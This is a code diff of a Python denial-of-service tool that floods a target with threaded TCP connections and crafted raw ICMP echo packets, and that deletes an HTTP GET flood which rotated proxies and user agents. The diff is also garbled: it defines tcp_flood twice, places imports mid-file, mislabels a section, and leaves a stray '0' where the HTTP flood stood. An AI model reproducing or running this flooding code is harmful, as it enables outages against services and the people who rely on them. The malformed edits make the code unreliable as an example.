@@ -46,58 +46,91 @@ def resolve_ip(target):
         sys.exit(1)
 
 # === LAYER 3: UDP FLOOD ===
-def udp_flood(ip, port, duration):
-    timeout = time.time() + duration
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = random._urandom(1024)
-    while time.time() < timeout:
-        try:
-            sock.sendto(payload, (ip, port))
-            print(f"{C}[UDP]{W} Sent to {ip}:{port}")
-        except Exception as e:
-            print(f"{R}[UDP ERROR]{W} {e}")
+def tcp_flood(ip, port, times, threads):
+    data = random._urandom(1024)
+    
+    def attack():
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, port))
+                for _ in range(times):
+                    s.send(data)
+                print(f"{R}[TCP]{W} Sent to {ip}:{port}")
+                s.close()
+            except:
+                print(f"{R}[TCP]{W} Failed to connect")
+
+    for _ in range(threads):
+        t = threading.Thread(target=attack)
+        t.start()
 
 # === LAYER 4: TCP FLOOD ===
-def tcp_flood(ip, port, duration):
-    timeout = time.time() + duration
-    while time.time() < timeout:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            s.connect((ip, port))
-            s.send(random._urandom(2048))
-            s.close()
-            print(f"{C}[TCP]{W} Flooded {ip}:{port}")
-        except Exception as e:
-            print(f"{R}[TCP ERROR]{W} {e}")
+import threading
+import socket
+import time
+import random
 
+def tcp_flood(ip, port, duration, threads=100):
+    timeout = time.time() + duration
+
+    def attack():
+        while time.time() < timeout:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect((ip, port))
+                s.send(random._urandom(2048))
+                s.close()
+                print(f"{C}[TCP]{W} Flooded {ip}:{port}")
+            except Exception as e:
+                print(f"{R}[TCP ERROR]{W} {e}")
+
+    for _ in range(threads):
+        t = threading.Thread(target=attack)
+        t.start()
 # === LAYER 7: HTTP GET FLOOD ===
-def http_flood(url, proxies, uas, duration):
-    timeout = time.time() + duration
-    while time.time() < timeout:
-        try:
-            proxy = random.choice(proxies)
-            ua = random.choice(uas)
-            headers = {'User-Agent': ua}
-            proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-            response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=3)
-            print(f"{Y}[HTTP]{W} {url} via {proxy} => {response.status_code}")
-        except Exception as e:
-            print(f"{R}[HTTP ERROR]{W} {e}")
-
+0
 # === PING FLOOD (ICMP) ===
+import socket
+import time
+import struct
+import random
+
+def checksum(data):
+    res = 0
+    for i in range(0, len(data)-1, 2):
+        res += (data[i] << 8) + data[i+1]
+    if len(data) % 2:
+        res += data[-1] << 8
+    while res >> 16:
+        res = (res & 0xFFFF) + (res >> 16)
+    return ~res & 0xFFFF
+
 def ping_flood(ip, duration):
     timeout = time.time() + duration
+    icmp_type = 8
+    icmp_code = 0
+    identifier = random.randint(0, 65535)
+    seq_number = 1
+
     while time.time() < timeout:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-            sock.settimeout(1)
-            sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (ip, 1))
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, identifier, seq_number)
+            payload = b'PingFlood' + random._urandom(48)
+            chksum = checksum(header + payload)
+            header = struct.pack("!BBHHH", icmp_type, icmp_code, chksum, identifier, seq_number)
+            packet = header + payload
+
+            sock.sendto(packet, (ip, 0))
             print(f"{B}[PING]{W} ICMP sent to {ip}")
             sock.close()
+            seq_number += 1
         except Exception as e:
             print(f"{R}[PING ERROR]{W} {e}")
-
 # === LAUNCH NODE.JS SCRIPTS ===
 def launch_node_scripts(target, port, duration, threads):
     node_scripts = [
